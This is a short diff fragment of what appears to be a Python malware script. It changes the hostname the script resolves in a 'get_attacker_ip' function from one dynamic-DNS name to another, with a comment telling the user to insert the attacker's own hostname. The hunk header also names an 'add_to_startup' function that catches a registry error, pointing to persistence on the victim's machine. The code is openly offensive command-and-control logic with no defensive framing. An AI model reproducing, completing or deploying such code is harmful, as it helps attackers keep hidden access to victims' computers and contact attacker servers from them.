@@ -135,7 +135,7 @@ def add_to_startup():
         print("Error adding to startup registry:", e)
 
 def get_attacker_ip():
-    hostname = "login22.ddns.net"  # Replace "attacker-hostname" with the actual hostname of the attacker
+    hostname = "hacker.dns.net"  # Replace "attacker-hostname" with the actual hostname of the attacker
     try:
         ip = socket.gethostbyname(hostname)
         return ip
